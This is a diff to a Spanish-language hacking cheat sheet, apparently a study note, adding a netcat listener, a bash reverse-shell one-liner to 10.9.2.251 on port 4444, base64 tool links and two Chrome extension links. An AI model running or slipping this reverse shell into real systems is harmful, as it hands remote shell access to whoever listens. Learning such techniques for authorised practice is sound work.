@@ -134,7 +134,16 @@
    ```bash
    find -name *.txt 
    ```
-   
+ 4. Poner en escucha con netcat
+
+   ```bash
+   nc -nlvp 4444
+   ```
+ 5. Crear una reverse shell TCP
+
+   ```bash
+   /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
+   ``` 
 
 # Sitios Web
 
@@ -166,4 +175,21 @@
    ```
    ```bash
    https://appdevtools.com/base64-encoder-decoder
+   ```
+
+
+# Extensiones para web browser
+
+1. Ripper Web Content | Capture Metadata Content
+
+   Ofrecido por Miguel Segovia - Correo electrónico miguelsegovia21@gmail.com 
+   ```bash
+   https://chromewebstore.google.com/detail/ripper-web-content-captur/popfhajlkgkiecedhefhifccngogomgh?hl=es-419&utm_source=ext_sidebar
+   ```
+
+2. User-Agent Switcher for Chrome
+
+   Desarrollador Google 1600 Amphitheatre Pkwy Mountain View, CA 94043 US - Correo electrónico cbe-cws-admins@google.com
+   ```bash
+   https://chromewebstore.google.com/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg?hl=es-419&utm_source=ext_sidebar
    ```
